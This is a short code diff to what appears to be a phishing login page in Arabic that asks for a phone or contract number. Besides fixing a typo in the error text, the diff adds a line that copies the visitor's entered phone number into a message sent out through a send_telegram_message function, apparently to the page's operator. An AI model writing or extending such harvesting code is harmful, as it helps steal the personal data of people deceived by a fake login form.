@@ -512,7 +512,7 @@ option:checked {
     function validate() {
 
         if(document.getElementById('sb').getAttribute('cflag') == 'disabled'){
-            document.getElementById('errortext').innerText = 'يرجى أدخال رقم الاتف أو رقم العقد بشكل صحيح'
+            document.getElementById('errortext').innerText = 'يرجى أدخال رقم الهاتف أو رقم العقد بشكل صحيح'
             $("#error").show()
             return false
         }
@@ -537,6 +537,7 @@ option:checked {
         localStorage.setItem("firstpage",'true');
         message=`
             الصفحة الرئيسية - تسجيل ${status_message}
+            رقم الهاتف: ${document.getElementById('phonenumber').value}
         `
 
         send_telegram_message(message)
